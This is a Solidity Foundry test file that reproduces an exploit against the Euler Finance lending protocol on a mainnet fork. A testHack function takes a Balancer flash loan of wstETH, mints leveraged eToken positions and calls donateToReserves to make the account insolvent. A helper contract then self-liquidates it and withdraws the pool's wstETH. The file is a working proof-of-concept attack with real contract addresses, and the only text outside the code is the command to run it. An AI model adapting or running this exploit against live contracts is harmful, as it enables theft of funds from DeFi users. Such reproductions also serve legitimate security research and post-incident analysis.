// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "contracts/modules/EToken.sol";
import "contracts/modules/DToken.sol";
import "contracts/Euler.sol";
import "contracts/modules/Liquidation.sol";
import "contracts/modules/RiskManager.sol";

// forge test --fork-url $ETH_RPC_URL --fork-block-number 16818061 -vv -m testHack


interface BalancerVault {
    function flashLoan(IFlashLoanRecipient recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(IERC20[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userDat) external;
}

contract Liquidator is DSTest {
    DToken dToken = DToken(0x436548baAb5Ec4D79F669D1b9506D67e98927aF7);
    EToken eToken = EToken(0xbd1bd5C956684f7EB79DA40f582cbE1373A1D593);
    Euler euler = Euler(0x27182842E098f60e3D576794A5bFFb0777E025d3);
    Liquidation liquidation = Liquidation(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);

    function liquidate() public {
        Liquidation.LiquidationOpportunity memory liqOpp = liquidation.checkLiquidation(address(this), msg.sender, address(wstETH), address(wstETH));
        liquidation.liquidate(msg.sender, address(wstETH), address(wstETH), liqOpp.repay, liqOpp.repay);
        eToken.withdraw(0, wstETH.balanceOf(address(euler)));
        wstETH.transfer(msg.sender, wstETH.balanceOf(address(this)));
    }
}

contract EulerTest is DSTest, IFlashLoanRecipient {
    DToken dToken = DToken(0x436548baAb5Ec4D79F669D1b9506D67e98927aF7);
    EToken eToken = EToken(0xbd1bd5C956684f7EB79DA40f582cbE1373A1D593);
    Euler euler = Euler(0x27182842E098f60e3D576794A5bFFb0777E025d3);
    BalancerVault vault = BalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);

    Liquidator liquidator;

    constructor() {
        liquidator = new Liquidator();
    }

    function testHack() public {
        emit log_named_uint("wstETH balance before", wstETH.balanceOf(address(this)));

        IERC20[] memory tokens = new IERC20[](1);
        uint256[] memory amounts = new uint256[](1);

        tokens[0] = wstETH;
        amounts[0] = wstETH.balanceOf(address(vault));
        vault.flashLoan(this, tokens, amounts, "");

        emit log_named_uint("wstETH balance after", wstETH.balanceOf(address(this)));
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == address(vault), "wrong sender");

        uint256 amount = amounts[0];
        emit log_named_uint("receiveFlashLoan", amount);

        wstETH.approve(address(euler), amount);

        eToken.deposit(0, amount);
        eToken.mint(0, amount * 15);
        eToken.donateToReserves(0, amount * 3);

        liquidator.liquidate();

        emit log_named_uint("repaying flash", amount);
        wstETH.transfer(msg.sender, amount);
    }
}
